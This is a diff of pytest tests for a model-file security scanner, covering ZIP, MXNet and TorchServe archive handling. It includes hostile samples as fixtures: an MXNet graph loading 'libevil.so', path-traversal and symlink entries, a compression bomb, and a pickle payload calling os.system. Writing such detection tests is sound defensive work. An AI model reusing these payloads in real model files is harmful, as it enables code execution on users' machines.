+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert extracted_member.stat().st_size < file_detection.MXNET_SYMBOL_SIGNATURE_READ_BYTES
+    assert result.scanner_name == "mxnet"
+    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
+
+
+def test_scan_nested_file_fails_closed_for_post_budget_shadowed_mxnet_nodes(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "config.json"
+    extracted_member.write_text(
+        '{"padding":['
+        + ",".join("0" for _ in range(5000))
+        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"nodes":[],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
+
+
+def test_scan_nested_file_generic_json_hint_before_value_budget_resolves_later_mxnet_structure(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "model.json"
+    extracted_member.write_text(
+        '{"heads":[[0,0,0]],"padding":['
+        + ",".join("0" for _ in range(5000))
+        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "mxnet"
+    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
+
+
+def test_scan_nested_file_generic_array_heads_before_value_budget_without_mxnet_structure_uses_existing_owner(
+    tmp_path: Path,
+) -> None:
+    extracted_member = tmp_path / "config.json"
+    extracted_member.write_text(
+        '{"heads":["classification"],"padding":[' + ",".join("0" for _ in range(5000)) + "]}",
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "manifest"
+    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
+
+
+def test_scan_nested_file_scalar_heads_generic_json_uses_existing_owner(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "config.json"
+    extracted_member.write_text(
+        '{"heads":"main","padding":[' + ",".join("0" for _ in range(5000)) + "]}",
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "manifest"
+    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
+
+
+def test_scan_nested_file_generic_json_with_padded_node_object_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "metadata.json"
+    extracted_member.write_text(
+        '{"nodes":[{"attrs":"'
+        + ("x" * 129)
+        + '","op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
+
+
+@pytest.mark.parametrize("initial_nodes", ["[]", "null"])
+def test_scan_nested_file_early_duplicate_mxnet_nodes_without_other_hints_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    initial_nodes: str,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "metadata.json"
+    extracted_member.write_text(
+        '{"nodes":'
+        + initial_nodes
+        + ',"padding":"'
+        + ("x" * 256)
+        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
+
+
+def test_scan_nested_file_oversized_generic_json_with_lone_array_heads_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "config.json"
+    extracted_member.write_text(
+        '{"heads":["classification"],"padding":"' + ("x" * 256) + '"}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
+
+
+def test_scan_nested_file_oversized_generic_json_with_mxnet_heads_shape_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "config.json"
+    extracted_member.write_text(
+        '{"heads":[[0,0,0]],"padding":"'
+        + ("x" * 256)
+        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
+
+
+def test_scan_nested_file_oversized_generic_json_with_hidden_mxnet_graph_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "config.json"
+    extracted_member.write_text(
+        '{"padding":"'
+        + ("x" * 256)
+        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
+
+
+def test_zip_scanner_marks_configured_skipped_archive_entries_incomplete(tmp_path: Path) -> None:
+    archive_path = tmp_path / "skip-metadata.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("metadata.json", '{"metadata":"' + ("x" * ((10 * 1024 * 1024) + 1)) + '"}')
+
+    result = ZipScanner({"skip_archive_entries": ["metadata.json"], "cache_enabled": False}).scan(str(archive_path))
+
+    assert result.success is False
+    assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "ZIP Member Analysis Coverage"
+        and check.status == CheckStatus.FAILED
+        and check.details["entry"] == "metadata.json"
+        for check in result.checks
+    )
+    assert not any(check.name == "MXNet Symbol Routing" for check in result.checks)
+
+
+def test_zip_scanner_preserves_executable_name_finding_for_skipped_archive_entry(tmp_path: Path) -> None:
+    archive_path = tmp_path / "skipped-executable.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("bin/run.sh", "#!/bin/sh\necho hidden\n")
+
+    result = ZipScanner({"skip_archive_entries": ["bin/run.sh"], "cache_enabled": False}).scan(str(archive_path))
+
+    assert result.success is False
+    assert any(
+        check.name == "Executable Archive Member Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details["entry"] == "bin/run.sh"
+        for check in result.checks
+    )
+
+
+def test_zip_scanner_checks_compression_ratio_before_skipping_archive_entry(tmp_path: Path) -> None:
+    archive_path = tmp_path / "skipped-bomb.zip"
+    with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
+        archive.writestr("model.weights.h5", b"0" * (ZipScanner.MIN_COMPRESSION_BOMB_UNCOMPRESSED_SIZE + 1))
+
+    result = ZipScanner({"skip_archive_entries": ["model.weights.h5"], "cache_enabled": False}).scan(str(archive_path))
+
+    assert any(
+        check.name == "Compression Ratio Check"
+        and check.status == CheckStatus.FAILED
+        and check.details["entry"] == "model.weights.h5"
+        and check.rule_code == "S410"
+        for check in result.checks
+    )
+
+
+def test_zip_scanner_validates_traversal_before_skipping_archive_entry(tmp_path: Path) -> None:
+    archive_path = tmp_path / "skipped-traversal.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("../metadata.json", '{"keras_version": "3.0.0"}')
+
+    result = ZipScanner({"skip_archive_entries": ["../metadata.json"], "cache_enabled": False}).scan(str(archive_path))
+
+    assert any(
+        check.name == "Path Traversal Protection"
+        and check.status == CheckStatus.FAILED
+        and check.details["entry"] == "../metadata.json"
+        for check in result.checks
+    )
+
+
+def test_zip_scanner_validates_readable_symlink_target_before_regular_skip(tmp_path: Path) -> None:
+    archive_path = tmp_path / "skipped-symlink.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        info = zipfile.ZipInfo("weights_link")
+        info.create_system = 3
+        info.external_attr = (stat.S_IFLNK | 0o777) << 16
+        archive.writestr(info, "../outside.bin")
+
+    result = ZipScanner({"skip_archive_entries": ["weights_link"], "cache_enabled": False}).scan(str(archive_path))
+
+    assert any(
+        check.name == "Symlink Safety Validation"
+        and check.status == CheckStatus.FAILED
+        and check.details["entry"] == "weights_link"
+        for check in result.checks
+    )
+
+
+def test_zip_scanner_does_not_reopen_known_unreadable_symlink(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    archive_path = tmp_path / "unreadable-symlink.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        info = zipfile.ZipInfo("symlink.txt")
+        info.create_system = 3
+        info.external_attr = (stat.S_IFLNK | 0o777) << 16
+        archive.writestr(info, "safe-target.bin")
+
+    with zipfile.ZipFile(archive_path) as archive:
+        unreadable_offset = archive.getinfo("symlink.txt").header_offset
+
+    def fail_read(_archive: zipfile.ZipFile, _info: zipfile.ZipInfo) -> str:
+        raise AssertionError("known unreadable symlink target should not be reopened")
+
+    monkeypatch.setattr(ZipScanner, "_read_symlink_target", fail_read)
+
+    set_config(ModelAuditConfig(severity={"S406": Severity.CRITICAL}))
+    try:
+        result = ZipScanner(
+            {
+                KNOWN_UNREADABLE_ARCHIVE_ENTRY_OFFSETS_CONFIG_KEY: [unreadable_offset],
+                "cache_enabled": False,
+            }
+        ).scan(str(archive_path))
+    finally:
+        reset_config()
+
+    assert result.success is False
+    assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert not any(check.name == "Symlink Safety Validation" for check in result.checks)
+    coverage_checks = [
+        check
+        for check in result.checks
+        if check.name == "ZIP Member Analysis Coverage" and check.status == CheckStatus.FAILED
+    ]
+    assert len(coverage_checks) == 1
+    assert coverage_checks[0].details["entry"] == "symlink.txt"
+    assert coverage_checks[0].rule_code == "S902"
+    assert coverage_checks[0].severity == IssueSeverity.INFO
+    assert not any(check.rule_code == "S406" for check in result.checks)
+
+
+def test_zip_scanner_configured_skip_name_cannot_inherit_symlink_severity_override(tmp_path: Path) -> None:
+    archive_path = tmp_path / "configured-skipped-symlink-name.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("symlink.txt", b"ordinary bytes")
+
+    set_config(ModelAuditConfig(severity={"S406": Severity.CRITICAL}))
+    try:
+        result = ZipScanner({"skip_archive_entries": ["symlink.txt"], "cache_enabled": False}).scan(str(archive_path))
+    finally:
+        reset_config()
+
+    coverage_checks = [
+        check
+        for check in result.checks
+        if check.name == "ZIP Member Analysis Coverage"
+        and check.status == CheckStatus.FAILED
+        and check.details["entry"] == "symlink.txt"
+    ]
+    assert len(coverage_checks) == 1
+    assert coverage_checks[0].rule_code == "S902"
+    assert coverage_checks[0].severity == IssueSeverity.INFO
+    assert not any(check.rule_code == "S406" for check in result.checks)
+
+
+def test_zip_scanner_validates_traversal_before_known_unreadable_symlink_skip(tmp_path: Path) -> None:
+    archive_path = tmp_path / "unreadable-traversal-symlink.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        info = zipfile.ZipInfo("../weights_link")
+        info.create_system = 3
+        info.external_attr = (stat.S_IFLNK | 0o777) << 16
+        archive.writestr(info, "safe-target.bin")
+
+    with zipfile.ZipFile(archive_path) as archive:
+        unreadable_offset = archive.getinfo("../weights_link").header_offset
+
+    result = ZipScanner(
+        {
+            KNOWN_UNREADABLE_ARCHIVE_ENTRY_OFFSETS_CONFIG_KEY: [unreadable_offset],
+            "cache_enabled": False,
+        }
+    ).scan(str(archive_path))
+
+    assert any(
+        check.name == "Path Traversal Protection"
+        and check.status == CheckStatus.FAILED
+        and check.details["entry"] == "../weights_link"
+        for check in result.checks
+    )
 
 
 def test_scan_zip_fails_closed_when_nested_recognized_header_scanner_is_unavailable(
@@ -1998,6 +3444,9 @@ class TestZipScanner:
         assert len(depth_checks) == 1
         assert "maximum zip nesting depth (2) exceeded" in depth_checks[0].message.lower()
         assert depth_checks[0].location == f"{outer_zip}:middle.tar:inner.zip"
+        assert depth_checks[0].severity == IssueSeverity.WARNING
+        assert depth_checks[0].rule_code == "S410"
+        assert "zip_depth_limit" in result.metadata["scan_outcome_reasons"]
 
     def test_scan_nested_mar_enforces_shared_depth_limit(self, tmp_path: Path) -> None:
         """Archive depth should not reset when ZIP recursion enters TorchServe MAR files."""
@@ -2067,12 +3516,19 @@ class TestZipScanner:
             if check.name == "TorchServe Handler Static Analysis" and check.status == CheckStatus.FAILED
         ]
         assert len(handler_failures) == 1
-        assert handler_failures[0].severity == IssueSeverity.WARNING
+        assert handler_failures[0].severity == IssueSeverity.INFO
         assert "oversized entry" in handler_failures[0].message.lower()
         assert "limit is 16 bytes" in handler_failures[0].message.lower()
         assert handler_failures[0].details.get("entry") == "handler.py"
         assert handler_failures[0].details.get("size_limit") == 16
         assert handler_failures[0].location == f"{mar_path}:handler.py"
+        assert "torchserve_handler_size_limit" in result.metadata["scan_outcome_reasons"]
+        _assert_inconclusive_zip_scan_not_cached(
+            mar_path,
+            "torchserve_handler_size_limit",
+            tmp_path / "oversized-handler-cache",
+            max_mar_python_analysis_bytes=16,
+        )
 
     def test_scan_manifestless_mar_reports_malformed_python_handler(self, tmp_path: Path) -> None:
         """Manifest-less .mar handlers with invalid syntax should emit parse-error analysis checks."""
@@ -2082,7 +3538,7 @@ class TestZipScanner:
 
         result = self.scanner.scan(str(mar_path))
         assert result.success is False
-        assert result.has_warnings is True
+        assert result.has_warnings is False
         assert result.has_errors is False
 
         handler_failures = [
@@ -2091,12 +3547,52 @@ class TestZipScanner:
             if check.name == "TorchServe Handler Static Analysis" and check.status == CheckStatus.FAILED
         ]
         assert len(handler_failures) == 1
-        assert handler_failures[0].severity == IssueSeverity.WARNING
+        assert handler_failures[0].severity == IssueSeverity.INFO
         assert "unable to parse python entry for static analysis" in handler_failures[0].message.lower()
         assert handler_failures[0].details.get("entry") == "handler.py"
         assert handler_failures[0].details.get("analysis_kind") == "syntax"
         assert "expected ':'" in str(handler_failures[0].details.get("parse_error")).lower()
         assert handler_failures[0].location == f"{mar_path}:handler.py"
+        assert "torchserve_handler_parse_failed" in result.metadata["scan_outcome_reasons"]
+        _assert_inconclusive_zip_scan_not_cached(
+            mar_path,
+            "torchserve_handler_parse_failed",
+            tmp_path / "malformed-handler-cache",
+        )
+
+    def test_scan_manifestless_mar_unreadable_python_handler_is_inconclusive(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """Unavailable fallback handler bytes should not be reported as malicious content."""
+        mar_path = tmp_path / "unreadable_handler.mar"
+        with zipfile.ZipFile(mar_path, "w") as archive:
+            archive.writestr("handler.py", "def handle(data, context):\n    return data\n")
+
+        real_open = open
+
+        def fail_handler_read(path: str, mode: str = "r", *args: Any, **kwargs: Any) -> Any:
+            if mode == "rb" and path.endswith("_handler.py"):
+                raise OSError("simulated fallback handler read failure")
+            return real_open(path, mode, *args, **kwargs)
+
+        monkeypatch.setattr(zip_scanner_module, "open", fail_handler_read, raising=False)
+
+        result = self.scanner.scan(str(mar_path))
+        handler_failures = [
+            check
+            for check in result.checks
+            if check.name == "TorchServe Handler Static Analysis" and check.status == CheckStatus.FAILED
+        ]
+        assert len(handler_failures) == 1
+        assert handler_failures[0].severity == IssueSeverity.INFO
+        assert "torchserve_handler_read_failed" in result.metadata["scan_outcome_reasons"]
+        _assert_inconclusive_zip_scan_not_cached(
+            mar_path,
+            "torchserve_handler_read_failed",
+            tmp_path / "unreadable-handler-cache",
+        )
 
     def test_scan_extensionless_nested_zip_recurses(self, tmp_path: Path) -> None:
         """Extensionless ZIP members should be recursively scanned by content."""
@@ -2237,6 +3733,8 @@ class TestZipScanner:
         assert result.success is False
         assert any(
             issue.message == "Maximum ZIP nesting depth (2) exceeded"
+            and issue.severity == IssueSeverity.WARNING
+            and issue.rule_code == "S410"
             and issue.location == f"{archive_path}:level0:level1"
             and issue.details.get("zip_entry") == "level0:level1"
             and issue.details.get("depth") == 2
@@ -2248,6 +3746,15 @@ class TestZipScanner:
             and ("os.system" in issue.message.lower() or "posix.system" in issue.message.lower())
             for issue in result.issues
         ), f"Depth limit should stop payload scan, got: {[(i.location, i.message) for i in result.issues]}"
+        assert "zip_depth_limit" in result.metadata["scan_outcome_reasons"]
+        _assert_inconclusive_zip_aggregate_not_cached(
+            archive_path,
+            "zip_depth_limit",
+            tmp_path / "depth-limit-cache",
+            expected_exit_code=1,
+            expected_security_findings=True,
+            max_zip_depth=2,
+        )
 
     def test_directory_traversal_detection(self):
         """Test detection of directory traversal attempts in ZIP files"""
@@ -2346,7 +3853,7 @@ class TestZipScanner:
         assert "size floor" in compression_checks[0].message
         assert compression_checks[0].details["min_uncompressed_size"] == 1024 * 1024
 
-    def test_configured_skip_entry_is_validated_but_not_recursively_scanned(self, tmp_path: Path) -> None:
+    def test_configured_skip_entry_is_incomplete_and_not_recursively_scanned(self, tmp_path: Path) -> None:
         archive_path = tmp_path / "owned-entry.zip"
         with zipfile.ZipFile(archive_path, "w") as archive:
             archive.writestr("metadata.json", b'{"owned": true}')
@@ -2368,7 +3875,14 @@ class TestZipScanner:
         )
         result = scanner.scan(str(archive_path))
 
-        assert result.success is True
+        assert result.success is False
+        assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
+        assert any(
+            check.name == "ZIP Member Analysis Coverage"
+            and check.status == CheckStatus.FAILED
+            and check.details["entry"] == "metadata.json"
+            for check in result.checks
+        )
         assert not any(path.endswith("_metadata.json") for path in nested_scan_paths)
         assert any(path.endswith("_payload.bin") for path in nested_scan_paths)
 
@@ -2419,53 +3933,6 @@ class TestZipScanner:
             for entry in result.metadata["contents"]
         )
 
-    @pytest.mark.parametrize(
-        ("scanner_name", "payload"),
-        [
-            ("cntk", _malicious_cntkv2_payload()),
-            ("lightgbm", _malicious_lightgbm_payload()),
-            ("rknn", _malicious_rknn_payload()),
-        ],
-    )
-    def test_nested_member_routes_renamed_strict_signature_payload(
-        self,
-        tmp_path: Path,
-        scanner_name: str,
-        payload: bytes,
-    ) -> None:
-        archive_path = tmp_path / "outer.zip"
-        with zipfile.ZipFile(archive_path, "w") as archive:
-            archive.writestr(f"{scanner_name}.jpg", payload)
-
-        result = self.scanner.scan(str(archive_path))
-
-        assert any(
-            entry["path"] == f"{archive_path}:{scanner_name}.jpg" and entry["type"] == scanner_name
-            for entry in result.metadata["contents"]
-        )
-        assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
-
-    @pytest.mark.parametrize(
-        "payload",
-        [
-            b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab inputs",
-            b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n",
-            b"RKNX\x01\x00\x00\x00runtime=rockchip\n",
-        ],
-    )
-    def test_nested_member_rejects_renamed_signature_near_match(self, tmp_path: Path, payload: bytes) -> None:
-        archive_path = tmp_path / "outer.zip"
-        with zipfile.ZipFile(archive_path, "w") as archive:
-            archive.writestr("near-match.jpg", payload)
-
-        result = self.scanner.scan(str(archive_path))
-
-        assert any(
-            entry["path"] == f"{archive_path}:near-match.jpg" and entry["type"] == "unknown"
-            for entry in result.metadata["contents"]
-        )
-        assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
-
     def test_nested_member_routes_prefixed_misnamed_onnx_by_structure(self, tmp_path: Path) -> None:
         """Unknown leading protobuf content must not hide a nested ONNX member."""
         pytest.importorskip("onnx")
@@ -2482,6 +3949,47 @@ class TestZipScanner:
             for entry in result.metadata["contents"]
         )
         assert any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)
+
+    def test_nested_member_routes_group_budget_prefixed_misnamed_onnx(self, tmp_path: Path) -> None:
+        """A bounded legal group prefix must not hide malicious nested ONNX."""
+        pytest.importorskip("onnx")
+        archive_path = tmp_path / "outer.zip"
+        onnx_path = create_mock_onnx(tmp_path / "model.onnx", op_type="PythonOp")
+        prefix_mock_onnx_with_unknown_group(onnx_path)
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("model.jpg", onnx_path.read_bytes())
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert any(
+            entry["path"] == f"{archive_path}:model.jpg" and entry["type"] == "onnx"
+            for entry in result.metadata["contents"]
+        )
+        assert any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)
+
+    def test_nested_declared_onnx_candidate_keeps_extension_owner_when_dependency_missing(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """A declared nested .onnx keeps normal ONNX ownership even with ambiguous magic."""
+        pytest.importorskip("onnx")
+        archive_path = tmp_path / "outer.zip"
+        onnx_path = create_mock_onnx(tmp_path / "model.onnx")
+        prefix_mock_onnx_with_unknown_group(onnx_path)
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("model.onnx", onnx_path.read_bytes())
+
+        monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert any(
+            entry["path"] == f"{archive_path}:model.onnx" and entry["type"] == "onnx"
+            for entry in result.metadata["contents"]
+        )
+        assert any(check.name == "ONNX Library Check" for check in result.checks)
+        assert not any(check.name == "ONNX Candidate Analysis" for check in result.checks)
 
     def test_nested_member_does_not_route_prefixed_generic_protobuf_as_onnx(self, tmp_path: Path) -> None:
         """An unknown protobuf prefix alone must not promote a nested member."""
@@ -2521,9 +4029,11 @@ class TestZipScanner:
             result = scanner.scan(current_path)
 
             assert result.success is False
-            # Should have a warning about max depth
             depth_issues = [i for i in result.issues if "depth" in i.message.lower()]
             assert len(depth_issues) >= 1
+            assert depth_issues[0].severity == IssueSeverity.WARNING
+            assert depth_issues[0].rule_code == "S410"
+            assert "zip_depth_limit" in result.metadata["scan_outcome_reasons"]
         finally:
             for path in paths_to_delete:
                 if os.path.exists(path):
@@ -2778,6 +4288,57 @@ class TestZipScanner:
         assert audit_result.success is False
         assert core.determine_exit_code(audit_result) == 2
 
+    def test_core_zip_nested_scan_exception_without_findings_returns_exit_code_2(self, tmp_path: Path) -> None:
+        """An unavailable nested member scan is incomplete coverage, not a finding."""
+        archive_path = tmp_path / "nested_scan_exception.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("member.bin", b"ordinary member")
+
+        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
+            raise RuntimeError("nested scanner unavailable")
+
+        scan_kwargs: dict[str, Any] = {NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan}
+        audit_result = core.scan_model_directory_or_file(
+            str(archive_path),
+            cache_enabled=False,
+            **scan_kwargs,
+        )
+
+        metadata = audit_result.file_metadata[str(archive_path)]
+        assert "zip_entry_scan_incomplete" in metadata["scan_outcome_reasons"]
+        entry_issues = [issue for issue in audit_result.issues if issue.message.startswith("Error scanning ZIP entry")]
+        assert len(entry_issues) == 1
+        assert entry_issues[0].severity == IssueSeverity.INFO
+        assert core.determine_exit_code(audit_result) == 2
+
+    def test_nested_scan_exception_name_cannot_inherit_symlink_severity_override(self, tmp_path: Path) -> None:
+        """Coverage gaps remain scan errors even when an entry name resembles a symlink signal."""
+        archive_path = tmp_path / "nested_failure_named_symlink.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("symlink.txt", b"ordinary member")
+
+        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
+            raise RuntimeError("nested scanner unavailable")
+
+        scan_kwargs: dict[str, Any] = {NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan}
+        set_config(ModelAuditConfig(severity={"S406": Severity.CRITICAL}))
+        try:
+            result = ZipScanner(config=scan_kwargs).scan(str(archive_path))
+            aggregate = core.scan_model_directory_or_file(
+                str(archive_path),
+                cache_enabled=False,
+                **scan_kwargs,
+            )
+        finally:
+            reset_config()
+
+        entry_checks = [check for check in result.checks if check.name == "ZIP Entry Scan"]
+        assert len(entry_checks) == 1
+        assert entry_checks[0].rule_code == "S902"
+        assert entry_checks[0].severity == IssueSeverity.INFO
+        assert not any(check.rule_code == "S406" for check in result.checks)
+        assert core.determine_exit_code(aggregate) == 2
+
     def test_zip_nested_critical_finding_does_not_mark_archive_incomplete(self, tmp_path: Path) -> None:
         """Real nested findings should fail the archive without claiming partial traversal."""
         archive_path = tmp_path / "nested_critical.zip"
@@ -2836,15 +4397,29 @@ class TestZipScanner:
             info.external_attr = (stat.S_IFLNK | 0o777) << 16
             archive.writestr(info, "a" * (ZipScanner.MAX_SYMLINK_TARGET_BYTES + 1))
 
-        result = self.scanner.scan(str(archive_path))
+        set_config(ModelAuditConfig(severity={"S406": Severity.CRITICAL}))
+        try:
+            result = self.scanner.scan(str(archive_path))
+        finally:
+            reset_config()
 
         assert result.success is False
-        assert any(
-            check.name == "Symlink Safety Validation"
-            and check.status == CheckStatus.FAILED
-            and "symlink target exceeds maximum size" in check.message.lower()
-            and check.details.get("entry") == "link.txt"
+        symlink_checks = [
+            check
             for check in result.checks
+            if check.name == "Symlink Safety Validation" and check.status == CheckStatus.FAILED
+        ]
+        assert len(symlink_checks) == 1
+        assert "symlink target exceeds maximum size" in symlink_checks[0].message.lower()
+        assert symlink_checks[0].details.get("entry") == "link.txt"
+        assert symlink_checks[0].rule_code == "S902"
+        assert symlink_checks[0].severity == IssueSeverity.INFO
+        assert not any(issue.rule_code == "S406" for issue in result.issues)
+        assert "zip_symlink_target_read_incomplete" in result.metadata["scan_outcome_reasons"]
+        _assert_inconclusive_zip_aggregate_not_cached(
+            archive_path,
+            "zip_symlink_target_read_incomplete",
+            tmp_path / "symlink-cache",
         )
 
     def test_oversized_entry_cleanup_removes_partial_temp_file(
@@ -2871,7 +4446,83 @@ class TestZipScanner:
             and check.details.get("entry") == "big.bin"
             for check in result.checks
         )
+        entry_checks = [check for check in result.checks if check.name == "ZIP Entry Scan"]
+        assert len(entry_checks) == 1
+        assert entry_checks[0].severity == IssueSeverity.INFO
+        assert "zip_entry_scan_incomplete" in result.metadata["scan_outcome_reasons"]
         assert list(scratch_dir.iterdir()) == []
+
+    def test_oversized_benign_zip_member_returns_inconclusive_exit_code(self, tmp_path: Path) -> None:
+        """Skipped ordinary member content is incomplete coverage, not a security finding."""
+        archive_path = tmp_path / "oversized_benign.zip"
+        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
+            archive.writestr("notes.txt", b"ordinary metadata " * 10)
+
+        result = core.scan_model_directory_or_file(
+            str(archive_path),
+            cache_scan_results=False,
+            max_entry_size=64,
+        )
+
+        metadata = result.file_metadata[str(archive_path)]
+        assert "zip_entry_scan_incomplete" in metadata["scan_outcome_reasons"]
+        assert not [
+            issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        ]
+        assert core.determine_exit_code(result) == 2
+        _assert_inconclusive_zip_aggregate_not_cached(
+            archive_path,
+            "zip_entry_scan_incomplete",
+            tmp_path / "oversized-benign-cache",
+            max_entry_size=64,
+        )
+
+    def test_oversized_hidden_zip_payload_returns_inconclusive_without_detected_finding(self, tmp_path: Path) -> None:
+        """A payload hidden above the extraction cap must not be reported as observed."""
+        archive_path = tmp_path / "oversized_hidden_payload.zip"
+        payload = b'cos\nsystem\n(S"echo pwned"\ntR.' + (b"A" * 128)
+        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
+            archive.writestr("payload.txt", payload)
+
+        result = core.scan_model_directory_or_file(
+            str(archive_path),
+            cache_scan_results=False,
+            max_entry_size=64,
+        )
+
+        metadata = result.file_metadata[str(archive_path)]
+        assert "zip_entry_scan_incomplete" in metadata["scan_outcome_reasons"]
+        assert not [
+            issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        ]
+        assert core.determine_exit_code(result) == 2
+        _assert_inconclusive_zip_aggregate_not_cached(
+            archive_path,
+            "zip_entry_scan_incomplete",
+            tmp_path / "oversized-hidden-cache",
+            max_entry_size=64,
+        )
+
+    def test_detected_zip_payload_after_skipped_member_preserves_security_exit_code(self, tmp_path: Path) -> None:
+        """Observed malicious content still wins over an informational coverage gap."""
+        archive_path = tmp_path / "detected_after_skipped_member.zip"
+        payload = b'cos\nsystem\n(S"echo pwned"\ntR.'
+        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
+            archive.writestr("large.txt", b"A" * 128)
+            archive.writestr("payload.txt", payload)
+
+        result = core.scan_model_directory_or_file(
+            str(archive_path),
+            cache_scan_results=False,
+            max_entry_size=64,
+        )
+
+        assert any(
